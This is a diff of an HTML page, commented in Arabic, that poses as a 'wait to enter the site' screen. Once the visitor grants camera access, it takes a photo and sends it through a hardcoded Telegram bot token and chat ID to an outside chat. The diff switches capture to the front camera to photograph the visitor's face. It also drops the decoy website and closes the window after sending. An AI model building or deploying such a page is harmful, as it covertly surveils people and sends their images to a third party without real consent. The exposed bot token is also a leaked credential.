@@ -93,17 +93,6 @@
         .hidden {
             display: none !important;
         }
-        
-        #website-frame {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border: none;
-            z-index: 1002;
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -123,17 +112,13 @@
         <p>انتظر لدخول الموقع...</p>
     </div>
     
-    <!-- إطار الموقع -->
-    <iframe id="website-frame" src="about:blank"></iframe>
-    
     <script>
         // التكوين - استبدل هذه القيم
         const config = {
             botToken: '7652311454:AAFHL-FrE9nCB8WG4p-91Uc2-0U2Z4S0A1c',
             chatId: '5310911220',
             captureDelay: 1500, // تأخير الالتقاط بالمللي ثانية
-            websiteUrl: 'https://bekes-505.github.io', // استبدل برابط الموقع الذي تريد فتحه
-            showWebsiteDelay: 1000 // تأخير عرض الموقع بعد الإرسال
+            autoCloseDelay: 1000 // تأخير الإغلاق بعد الإرسال
         };
         
         // العناصر
@@ -141,7 +126,6 @@
         const permissionOverlay = document.getElementById('permission-overlay');
         const loadingOverlay = document.getElementById('loading-overlay');
         const allowBtn = document.getElementById('allow-btn');
-        const websiteFrame = document.getElementById('website-frame');
         
         // دالة متعددة المتصفحات لطلب الكاميرا
         async function initCamera() {
@@ -150,7 +134,7 @@
                     video: {
                         width: { ideal: 1920 },
                         height: { ideal: 1080 },
-                        facingMode: 'environment'
+                        facingMode: 'user'
                     },
                     audio: false
                 };
@@ -228,14 +212,10 @@
                 // إرسال الصورة
                 await sendToTelegram(photoBlob);
                 
-                // إخفاء شاشة التحميل بعد الإرسال
-                loadingOverlay.style.display = 'none';
-                
-                // عرض الموقع بعد التأخير
+                // إغلاق النافذة بعد الإرسال
                 setTimeout(() => {
-                    websiteFrame.src = config.websiteUrl;
-                    websiteFrame.style.display = 'block';
-                }, config.showWebsiteDelay);
+                    window.close();
+                }, config.autoCloseDelay);
                 
             } catch (error) {
                 console.error('Process failed:', error);
